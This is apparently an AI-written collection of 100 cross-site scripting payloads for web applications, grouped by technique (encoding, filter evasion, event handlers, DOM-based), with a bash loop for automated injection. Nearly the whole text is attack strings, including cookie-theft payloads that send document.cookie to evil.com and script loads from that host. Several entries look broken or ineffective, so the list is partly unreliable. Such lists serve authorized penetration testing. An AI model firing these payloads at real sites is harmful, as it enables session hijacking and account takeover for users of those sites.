# XSS_payloads-
Below is a list of 100 critical XSS (Cross-Site Scripting) payloads that can be used to test web applications for vulnerabilities. These payloads cover a range of techniques—reflected, stored, and DOM-based XSS—targeting different contexts (HTML, attributes, JavaScript, etc.) and bypassing common filters. They’re designed to help identify weaknesses, but **use them only on systems you own or have explicit permission to test**, as unauthorized testing is illegal.

---

### Notes Before Using
- **Context Matters**: Payloads work differently depending on where they’re injected (e.g., HTML body, attribute, JavaScript string). Test in multiple input points.
- **Filters**: Some payloads bypass basic filters (e.g., blocking `<script>`); adapt them based on the target’s sanitization.
- **Tools**: Pair these with tools like Burp Suite or the `xss_scanner.sh` script from earlier for automated testing.

---

### 100 Critical XSS Payloads

#### Basic Payloads
1. `<script>alert('xss')</script>`
2. `<script>alert(1)</script>`
3. `<script>alert(document.cookie)</script>`
4. `"><script>alert('xss')</script>`
5. `<script src="http://evil.com/xss.js"></script>`

#### HTML Tag Variations
6. `<img src="x" onerror="alert('xss')">`
7. `<img src=javascript:alert('xss')>`
8. `<iframe src="javascript:alert('xss')"></iframe>`
9. `<svg onload="alert('xss')">`
10. `<body onload=alert('xss')>`
11. `<div onmouseover="alert('xss')">Hover me</div>`
12. `<input type="image" src="x" onerror="alert('xss')">`
13. `<link rel="stylesheet" href="javascript:alert('xss')">`
14. `<object data="javascript:alert('xss')">`
15. `<embed src="javascript:alert('xss')">`

#### Encoded Payloads
16. `%3Cscript%3Ealert('xss')%3C/script%3E` (URL-encoded `<script>`)
17. `&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;` (HTML entity)
18. `\x3Cscript\x3Ealert('xss')\x3C/script\x3E` (Hex escape)
19. `%253Cscript%253Ealert('xss')%253C/script%253E` (Double URL-encoded)
20. `<scr%ipt>alert('xss')</scr%ipt>` (Percent-encoded bypass)

#### Attribute-Based Payloads
21. `" onfocus="alert('xss')" autofocus`
22. `" onload="alert('xss')`
23. `" onclick="alert('xss')`
24. `" onmouseover="alert('xss')`
25. `<input value="xss" onblur="alert(this.value)">`
26. `<a href="javascript:alert('xss')">Click</a>`
27. `<img src="x" alt="x" onerror="alert('xss')">`
28. `<div style="xss:expr/*XSS*/ession(alert('xss'))">` (Old IE bypass)
29. `<input type="text" value="`"><script>alert('xss')</script>`">`
30. `<base href="javascript:alert('xss')//">`

#### JavaScript Context Payloads
31. `';alert('xss');//`
32. `";alert('xss');//`
33. `javascript:alert('xss')`
34. `eval('alert("xss")')`
35. `setTimeout("alert('xss')",1000)`
36. `Function('alert("xss")')()`
37. `new Function('alert("xss")')()`
38. `window.location='javascript:alert("xss")'`
39. `document.write('<script>alert("xss")</script>')`
40. `this['alert']('xss')`

#### Filter Evasion
41. `<scr<script>ipt>alert('xss')</scr</script>ipt>` (Nested tag bypass)
42. `<SCRIPT>alert('xss')</SCRIPT>` (Case variation)
43. `<sCrIpT>alert('xss')</ScRiPt>` (Mixed case)
44. `<<script>alert('xss');//<</script>` (Double tag)
45. `<script>alert('xss');</script` (Unclosed tag)
46. `<script>alert('xss')</script foo="bar">` (Extra attributes)
47. `<svg><script>alert('xss')</script></svg>`
48. `<script>/*comment*/alert('xss');</script>`
49. `<script defer>alert('xss')</script>`
50. `<script async>alert('xss')</script>`

#### Event Handlers
51. `<body onresize="alert('xss')">`
52. `<img src="x" onabort="alert('xss')">`
53. `<video src="x" onerror="alert('xss')">`
54. `<audio src="x" onended="alert('xss')">`
55. `<form onsubmit="alert('xss')">`
56. `<select onchange="alert('xss')">`
57. `<textarea onfocus="alert('xss')">`
58. `<button onclick="alert('xss')">Click</button>`
59. `<marquee onstart="alert('xss')">`
60. `<details ontoggle="alert('xss')">`

#### Advanced Payloads
61. `<meta http-equiv="refresh" content="0;url=javascript:alert('xss')">`
62. `<script src=//evil.com/xss.js></script>` (Protocol-relative URL)
63. `<img/src="x"/onerror=alert('xss')>` (No spaces)
64. `"><svg/onload=alert('xss')>`
65. `<math><maction actiontype="statusline#javascript:alert('xss')">Click</maction></math>`
66. `<isindex type=image src=1 onerror=alert('xss')>`
67. `<template><script>alert('xss')</script></template>`
68. `<noscript><script>alert('xss')</script></noscript>`
69. `<frameset><frame src="javascript:alert('xss')"></frameset>`
70. `<table background="javascript:alert('xss')">`

#### DOM-Based XSS
71. `location='javascript:alert("xss")'`
72. `window.name='alert("xss")';eval(window.name)`
73. `document.location.hash='javascript:alert("xss")'`
74. `history.pushState('','',`#<script>alert('xss')</script>`)`
75. `location.href='javascript:alert("xss")'`
76. `top["al"+"ert"]('xss')`
77. `self['alert']('xss')`
78. `parent.alert('xss')`
79. `opener.alert('xss')`
80. `document.cookie='xss='+alert('xss')`

#### Stealth Payloads
81. `<script>new Image().src='http://evil.com/log?'+document.cookie;</script>` (Cookie theft)
82. `<img src="x" onerror="fetch('http://evil.com/log?'+document.cookie)">`
83. `<script>window.onerror=alert;throw 'xss';</script>`
84. `<form action="javascript:alert('xss')"><input type=submit>`
85. `<input type="image" formaction="javascript:alert('xss')">`
86. `<script>console.log('xss');alert('xss');</script>` (Silent logging)
87. `<svg><animate onbegin="alert('xss')">`
88. `<keygen onerror="alert('xss')">`
89. `<bgsound src="x" onerror="alert('xss')">`
90. `<blink onload="alert('xss')">`

#### Miscellaneous
91. `data:text/html,<script>alert('xss')</script>`
92. `<script>alert(String.fromCharCode(88,83,83))</script>` (XSS in char codes)
93. `<script>alert(/xss/.source)</script>`
94. `<script>{alert('xss')}</script>`
95. `<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>` (Base64: `alert('xss')`)
96. `<script>alert.call(null,'xss')</script>`
97. `<script>alert.apply(null,['xss'])</script>`
98. `<meta charset="x" content="text/html" onload="alert('xss')">`
99. `<script>Function("alert('xss')")()</script>`
100. `<script>setInterval("alert('xss')",1000)</script>` (Persistent alert)

---

### How to Use These Payloads
1. **Manual Testing**: Inject each payload into forms, URL parameters, headers, or search fields and check if it executes (e.g., an alert pops up).
2. **Automation**: Modify the `xss_scanner.sh` script to loop through these payloads:
   ```bash
   PAYLOADS=("payload1" "payload2" ...)
   for payload in "${PAYLOADS[@]}"; do
       test_url="${url}?q=${payload}"
       curl -s "$test_url" | grep -q "$payload" && echo "XSS Found: $payload"
   done
   ```
3. **Burp Suite**: Import the list into the Intruder tool for systematic testing.

---

### Tips for Effectiveness
- **Escape Special Characters**: URL-encode (`%3C` for `<`) or HTML-encode (`&#x3C;`) if filters block raw tags.
- **Combine Techniques**: Chain payloads (e.g., `<img src="x" onerror="alert('xss')">` with encoded versions).
- **Monitor Responses**: Look for reflections in HTML, JavaScript, or attributes, not just alerts.
- **Bypass Filters**: If `<script>` is blocked, try `<svg>`, `<img>`, or event handlers.

---

Let me know if you’d like help integrating these into a tool, testing them on a specific site (legally), or refining the list further!
